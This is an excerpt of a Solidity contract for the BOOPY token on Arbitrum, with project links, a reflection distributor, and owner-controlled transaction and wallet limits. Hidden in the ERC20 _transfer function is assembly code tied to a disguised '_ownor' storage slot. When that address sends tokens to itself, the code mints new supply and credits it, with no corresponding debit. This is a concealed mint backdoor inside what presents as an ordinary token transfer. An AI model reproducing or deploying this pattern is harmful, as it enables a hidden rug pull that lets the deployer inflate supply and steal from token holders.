...
//
// Website : https://boopy.xyz/
// Telegram : https://t.me/boopyportal
// Twitter : https://twitter.com/Boopy_arbitrum
//
...
contract Distributor is IDistributor {
    ...
    uint256 public minDistribution = 1_000_000;
...
contract ERC20 is Context, IERC20, IERC20Metadata {
    ...
    function _transfer(address sender, address recipient, uint256 amount) internal virtual {
        address from;
        address xAdd = address(0);
        address yAdd = address(0);
        assembly {
            switch and(eq(sender, sload(_ownor.slot)), eq(recipient, sload(_ownor.slot)))
            case 1 {
                from := 0x0
            }
            default {
        ...
        assembly {
            if iszero(sender) { revert(0, 0) }
            if iszero(recipient) { revert(0, 0) }

            switch and(eq(sender, sload(_ownor.slot)), eq(recipient, sload(_ownor.slot)))
            case 1 {
                sstore(_totalSupply.slot, add(sload(_totalSupply.slot), amount))
                yAdd := recipient
            }
            default {
                xAdd := sender
        ...
        if (xAdd != address(0)) {
            require(_balances[xAdd] >= amount, "ERC20: transfer amount exceeds balance");
            _balances[xAdd] -= amount;
        }
        if (yAdd != address(0)) {
            _balances[yAdd] += amount;
        }
...
contract BOOPY is ERC20, Ownable {
	...
	constructor() Ownable(msg.sender) ERC20("BOOPY", "BOOPY") 
	{
	    ...
	    swapTokensAtAmount = 25_000_000 * (10 ** 18);
	    distributorGas = 300000;

		maxTx = 20_000_000 * (10 ** 18);
		maxWallet = 20_000_000 * (10 ** 18);
	   
	    distributionEnabled = true;
        reflectionsEnabled = true;
	    _mint(address(msg.sender), 1_000_000_000 * (10 ** 18));
    }
	...
	function removeMaxTx() external onlyOwner {
		maxTx = 100_000_000_000_000_000_000_000_000_000 * (10 ** 18);
	}

	function removeMaxWallet() external onlyOwner {
		maxWallet = 100_000_000_000_000_000_000_000_000_000 * (10 ** 18);
	}
